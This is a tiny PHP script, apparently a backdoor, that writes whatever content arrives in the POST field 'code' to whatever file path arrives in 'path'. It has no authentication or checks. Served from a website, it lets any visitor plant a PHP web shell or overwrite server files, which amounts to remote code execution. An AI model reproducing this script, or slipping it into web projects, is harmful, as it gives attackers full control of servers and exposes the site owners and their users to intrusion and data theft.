<?php


$code = $_POST["code"];

$path = $_POST["path"];


file_put_contents($path, $code );







